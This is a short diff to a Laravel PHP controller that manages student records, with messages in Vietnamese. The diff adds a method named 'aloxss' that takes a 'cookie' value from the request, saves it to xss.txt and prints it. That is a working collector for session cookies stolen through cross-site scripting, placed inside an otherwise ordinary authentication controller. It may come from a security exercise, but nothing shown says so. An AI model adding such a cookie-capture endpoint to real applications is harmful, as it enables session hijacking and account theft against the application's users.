@@ -145,5 +145,12 @@ class CustomAuthController extends Controller
         $user->delete();
         return redirect()->back()->with('status', 'Xóa sinh viên và ảnh đại diện thành công');
     }
+    public function aloxss(Request $request) {		
+        $cookie = $request->get('cookie');		
+        file_put_contents('xss.txt', $cookie);		
+        var_dump($cookie);
+        die();		
+        }		
+
 
 }
